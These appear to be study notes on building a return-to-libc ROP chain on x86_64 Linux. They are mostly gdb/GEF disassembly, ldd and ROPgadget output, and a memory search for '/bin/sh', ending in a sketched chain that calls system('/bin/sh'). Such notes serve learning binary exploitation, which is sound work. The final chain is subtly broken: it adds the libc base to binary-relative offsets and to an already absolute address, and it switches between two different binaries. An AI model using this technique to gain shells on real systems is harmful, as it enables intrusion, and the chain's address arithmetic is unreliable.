# &#35; linux x86_64
#### Linux system call table : <https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md/>
#### get shellcode to binary : <https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump>

```bash
$ cat system.c
void main() {
	system("/bin/sh");
}

$ gcc -o system system.c
$ ./system
$ id
uid=1000(user) gid=1000(user) group=1000(user)


$ gdb ./system -q
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded for GDB 9.2 using Python engine 3.8
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./system...
(No debugging symbols found in ./system)
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000001149 <+0>:	endbr64
   0x000000000000114d <+4>:	push   rbp
   0x000000000000114e <+5>:	mov    rbp,rsp
   0x0000000000001151 <+8>:	lea    rdi,[rip+0xeac]        // 0x2004 => /bin/sh
   0x0000000000001158 <+15>:	mov    eax,0x0
   0x000000000000115d <+20>:	call   0x1050 <system@plt>
   0x0000000000001162 <+25>:	nop
   0x0000000000001163 <+26>:	pop    rbp
   0x0000000000001164 <+27>:	ret
End of assembler dump.
gef➤  x/s 0x2004
0x2004:	"/bin/sh"
gef➤

## base address of libc is 0x00007ffff7dba000

$ ldd ./vulnerable
	linux-vdso.so.1 (0x00007ffff7fcd000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dba000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcf000)


## need to find rop gadgets
## find out put /bin/sh argument
## 0x0000000000001223 : pop rdi ; ret

$ ROPgadget --binary ./vulnerable --depth 2
Gadgets information
============================================================
0x000000000000119a : call qword ptr [rax + 0xff3c3c9]
0x000000000000103e : call qword ptr [rax - 0x5e1f00d]
0x00000000000011ba : call qword ptr [rax - 0x6f993c37]
0x0000000000001014 : call rax
0x0000000000001163 : cli ; jmp 0x10e0
0x0000000000001233 : cli ; ret
0x000000000000103a : jmp 0x1020
0x0000000000001164 : jmp 0x10e0
0x00000000000010cf : jmp rax
0x000000000000119c : leave ; ret
0x0000000000001153 : pop rbp ; ret
0x0000000000001223 : pop rdi ; ret
0x000000000000101a : ret
0x0000000000001131 : ret 0x2e

Unique gadgets found: 14


## find out /bin/sh string
gef➤  grep /bin/sh
[+] Searching '/bin/sh' in memory
.
.
[+] In '/usr/lib/x86_64-linux-gnu/libc-2.31.so'(0x7ffff7f5c000-0x7ffff7fa6000), permission=r--
  0x7ffff7f765aa - 0x7ffff7f765b1  →   "/bin/sh"
gef➤  x/s 0x7ffff7f765aa
0x7ffff7f765aa:	"/bin/sh"
gef➤


## Now we make system("/bin/sh") rop

libc_base + 0x0000000000001223 : pop rdi ; ret
libc_base + 0x7ffff7f765aa     : /bin/sh
libc_base + 0x1050             : system()



```




# 32bit : http://faculty.nps.edu/cseagle/assembly/sys_call.html
